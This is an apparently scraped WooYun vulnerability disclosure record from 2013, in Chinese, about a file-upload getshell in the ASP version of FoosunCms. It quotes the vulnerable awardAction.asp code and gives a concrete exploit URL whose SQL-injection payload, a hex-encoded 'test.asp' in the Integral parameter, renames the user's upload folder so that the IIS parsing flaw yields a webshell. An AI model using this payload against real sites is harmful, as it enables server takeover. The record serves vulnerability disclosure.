{"id": 7199, "wybug_id": "wooyun-2013-038315", "wybug_title": "FoosunCms getshell", "wybug_corp": "FoosunCms", "wybug_author": "Code_Sec", "wybug_date": "2013-09-27 08:38", "wybug_open_date": "2013-12-26 08:38", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-27：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-12-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： FoosunCms的asp版本getshell 详细说明：  在文件\\User\\award\\awardAction.asp中：\nIntegral=NoSqlHack(request.QueryString(\"Integral\"))if action=\"join\" then\tUser_Conn.execute(\"Insert into FS_ME_User_Prize (prizeid,usernumber,awardID) values(\"&CintStr(prizeID)&\",'\"&session(\"FS_UserNumber\")&\"',\"&CintStr(awardID)&\")\")\t'获得当前参加人数--------------------------------\tUser_Conn.execute(\"Update FS_ME_Users set Integral=(Integral-\"&Integral&\") where usernumber='\"&session(\"FS_UserNumber\")&\"'\")\n请直接无视NoSqlHack,由于sql注入是发生在update语句中，所以我们可以修改表S_ME_Users的任意记录的任意字段信息\n\nwebshell还可以用来代替access我们文件管理中上传个图片文件：http://192.168.1.101/UserFiles/27015564I69/2013_09_27_01_10_0390446.jpgUserNumber就是等于27015564I69通过以上的sql注入漏洞，直接update为test.asphttp://192.168.1.101/User/award/awardAction.asp?action=join&awardID=1&prizeID=1&Integral=1),UserNumber=0x74006500730074002E00610073007000,sex=(1\n\n退出再重新登录\n\n生成test.asp目录，后续上传的文件都会保存在该文件中利用iis解析漏洞获取webshell   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 Code_Sec@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-09-27 09:26 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  又见风讯    \n     2013-09-27 11:02 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  求帝国    \n     2013-12-26 13:09 |    \t\tLeadUrLife \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:14        | 好好学习 天天向上)\t\t \n  good job    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}